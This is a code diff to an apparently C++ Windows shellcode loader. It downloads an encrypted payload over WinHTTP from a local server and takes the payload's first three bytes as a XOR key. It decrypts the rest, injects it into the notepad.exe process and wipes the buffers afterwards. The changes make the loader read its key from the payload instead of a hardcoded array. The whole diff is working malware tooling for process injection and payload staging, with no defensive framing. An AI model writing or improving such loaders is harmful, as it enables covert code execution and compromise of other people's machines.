@@ -326,6 +326,7 @@ int main()
     DWORD dwDownloaded = 0;
     LPSTR pszOutBuffer;
     BOOL bResults = FALSE;
+    SIZE_T keySize = 3;
 
     // Initialize WinHTTP
     hSession = Open();
@@ -334,7 +335,7 @@ int main()
         hConnect = Connect(hSession, L"127.0.0.1", 8080);
 
     if (hConnect)
-        hRequest = OpenRequest(hConnect, L"/Desktop/Work/Codespython/Test/test");
+        hRequest = OpenRequest(hConnect, L"/");
 
     // Send a request
     if (hRequest)
@@ -346,41 +347,61 @@ int main()
 
     // Keep checking for data until there is nothing left
     LPSTR shell = CheckData(hRequest);
-    //printf("%s \n \n", shell);
+
+    // Manually assign the first three bytes to the key
+    unsigned char key[3];
+
+    // Assign the first three bytes to the key
+    key[0] = (unsigned char)shell[0];
+    key[1] = (unsigned char)shell[1];
+    key[2] = (unsigned char)shell[2];
+
+    // Point to the remaining payload
+    LPSTR encryptedPayload = shell + 3;
+
+    // Output or process the key and payload
+    //printf("Key: %02x %02x %02x\n", key[0], key[1], key[2]);
+    
+    // Output the full payload in bytes
+    //printf("Payload (Bytes): ");
+    //for (size_t i = 0; i < (sPayloadSize); ++i) { // Subtracting 3 to exclude the key size
+    //    printf("%02x", (unsigned char)encryptedPayload[i]);
+    //}
+    //printf("\n");
 
     // Close handles
     if (hRequest) WinHttpCloseHandle(hRequest);
     if (hConnect) WinHttpCloseHandle(hConnect);
     if (hSession) WinHttpCloseHandle(hSession);
 
-    if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";
+    //if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";
 
+    //const size_t SHELLCODE_SIZE = sPayloadSize;
 
-    const size_t SHELLCODE_SIZE = sPayloadSize + 1; //sizeof(shell);
+    UCHAR decryptedPayload[sPayloadSize] = {};
 
-    const unsigned char KEY[] = { 0x58, 0x31, 0x64 };
-    const size_t KEY_SIZE = sizeof(KEY);
-
-
-    UCHAR decryptedPayload[SHELLCODE_SIZE] = {};
-
-    for (size_t i = 0; i < SHELLCODE_SIZE - 1; ++i) {
-        decryptedPayload[i] = shell[i] ^ KEY[i % KEY_SIZE];
+    for (size_t i = 0; i < sPayloadSize; ++i) {
+        decryptedPayload[i] = encryptedPayload[i] ^ key[i % keySize];
         //printf("/%x", decryptedPayload[i]);
     };
 
-    // Resolve the PID dynamically for a process name
-    const wchar_t* targetProcessName = L"notepad.exe";
-    DWORD pid = GetProcessIdByName(targetProcessName);
+    // Resolve the PID dynamically for a process 
+    DWORD pid = GetProcessIdByName(L"notepad.exe");
 
     if (pid == 0) {
         std::cout << "Target process not found.\n";
         return 1; // Exit if process is not found
     }
 
-    InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid);
+    InjectShellcode(decryptedPayload, sPayloadSize, pid);
 
-    Sleep(10000);
+    SecureZeroMemory(shell, sizeof(shell));
+
+    SecureZeroMemory(encryptedPayload, sizeof(encryptedPayload));
+
+    SecureZeroMemory(decryptedPayload, sizeof(decryptedPayload));
+
+    Sleep(5000);
 
     // Libérer les DLL
     FreeLib(&chargeDLL);
